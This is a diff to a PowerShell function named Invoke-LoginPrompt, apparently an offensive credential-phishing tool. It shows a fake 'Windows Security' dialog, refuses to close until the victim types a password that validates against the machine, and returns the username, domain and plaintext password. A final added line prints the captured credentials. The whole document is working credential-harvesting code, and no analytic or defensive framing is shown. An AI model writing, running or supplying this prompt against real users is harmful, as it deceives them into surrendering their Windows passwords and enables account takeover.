@@ -19,20 +19,22 @@ Function Invoke-LoginPrompt {
     $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
     $InitialPrompt = "Please enter user credentials"
     $RetryPrompt = "Invalid credentials. Please try again"
-    $BailOutOnCancel = $False
+    $BailOutOnCancel = $True
+    $auth = @{ Domain = "$env:userdomain"; UserName = "$env:username"; Password = ""; UserCanceled = $True }
     Do {
-        $password = ""
-        $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), "$env:userdomain\$env:username","")
+        $auth.Password = ""
+        $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), $(if($auth.Domain) { $("{0}\{1}" -f $auth.Domain, $auth.UserName) } else { $auth.UserName }),"")
         If ($cred) {
             $netcred = $cred.GetNetworkCredential()
             # User/domain selection might have changed, update
-            $username = $netcred.UserName
-            $domain = $netcred.UserName
-            $full = "$domain" + "\" + "$username"
-            $password = $netcred.password
+            $netcred.PSObject.Properties | ForEach-Object { If ($_.Name -In $auth.Keys) { $auth[$_.Name] = $_.Value } }
         } ElseIf ($BailOutOnCancel) {
-            Return
+            Return New-Object PSObject -Property $auth
         }
-    } While($DS.ValidateCredentials("$full", "$password") -ne $True)
-    $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password
+        If (-not $auth.Domain) { $auth.Domain = "$env:userdomain" }
+    } While($DS.ValidateCredentials($("{0}\{1}" -f $auth.Domain, $auth.UserName), $auth.Password) -ne $True)
+    $auth.UserCanceled = $False
+    Return New-Object PSObject -Property $auth
 }
+
+Write-Host $(Invoke-LoginPrompt)
